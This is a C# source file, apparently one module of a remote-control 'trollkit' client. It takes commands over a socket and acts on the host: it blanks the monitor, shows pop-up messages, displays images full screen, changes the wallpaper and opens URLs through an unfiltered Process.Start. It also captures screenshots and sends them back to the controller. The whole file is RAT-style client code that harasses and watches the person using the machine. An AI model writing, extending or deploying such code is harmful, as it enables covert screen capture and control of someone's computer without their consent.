using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class VisualsHandler : ICommandHandler
	{
		private const int SC_MONITORPOWER = 0xF170;
		private const int WM_SYSCOMMAND = 0x0112;

		[DllImport("user32.dll")]
		public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);


		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "BlackScreen":
					return MonitorSleep();
				case "TextBox":
					return TextBox(obj.Value);
				case "ShowImage":
					return ShowImage(obj.Value);
				case "OpenSite":
					return OpenSite(obj.Value);
				case "SetBackground":
					return SetWallpaper(obj.Value);
				case "MakeScreenshot":
					return MakeScreenshot(s, obj.Value);
			}

			return false;
		}

		private bool MakeScreenshot(Socket s, string monitorNumber)
		{
			try
			{
				string imageString = Screenshot.MakeScreenshot(); //currently primary monitor
				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ScreenshotResponse", Value = imageString };
				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool MonitorSleep()
		{
			try
			{
				SendMessageW(GetHandle(), WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)2);
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private static IntPtr GetHandle()
		{
			return Process.GetCurrentProcess().MainWindowHandle;
		}

		private bool TextBox(string textToDisplay)
		{
			try
			{
				string title = textToDisplay.Split('|')[0];
				string[] content = textToDisplay.Split(new[] { '|' }, 2);

				Array values = Enum.GetValues(typeof(MessageBoxIcon));
				Random random = new Random();
				MessageBoxIcon randomMessageBoxIcon = (MessageBoxIcon)values.GetValue(random.Next(values.Length));

				if (content.Length == 1)
				{
					System.Windows.Forms.MessageBox.Show(title, "", MessageBoxButtons.OK, randomMessageBoxIcon);
				}
				else
				{
					System.Windows.Forms.MessageBox.Show(content[1], title, MessageBoxButtons.OK, randomMessageBoxIcon);
				}
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool ShowImage(string base64Image)
		{
			try
			{
				byte[] bytes = Convert.FromBase64String(base64Image);

				var tempFileName = Path.GetTempFileName();
				File.WriteAllBytes(tempFileName, bytes);

				string path = Environment.GetFolderPath(
					Environment.SpecialFolder.ProgramFiles);

				var psi = new ProcessStartInfo(
					"rundll32.exe",
					String.Format(
						"\"{0}{1}\", ImageView_Fullscreen {2}",
						Environment.Is64BitOperatingSystem ?
							path.Replace(" (x86)", "") :
							path
							,
						@"\Windows Photo Viewer\PhotoViewer.dll",
						tempFileName)
					);

				psi.UseShellExecute = false;

				var viewer = Process.Start(psi);
				viewer.EnableRaisingEvents = true;
				viewer.Exited += (o, args) =>
				{
					File.Delete(tempFileName);
				};

				Thread.Sleep(1000); //wait for the other program to display and get focus
				Keyboard keyboard = new Keyboard();
				keyboard.Send(Keyboard.ScanCodeShort.F11);
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool SetWallpaper(string base64Image)
		{
			try
			{
				byte[] bytes = Convert.FromBase64String(base64Image);
				MemoryStream byteStream = new MemoryStream(bytes);
				Wallpaper.Set(Image.FromStream(byteStream), Wallpaper.Style.Fill);
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool OpenSite(string url)
		{
			try
			{
				Process.Start(url);
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}
	}
}
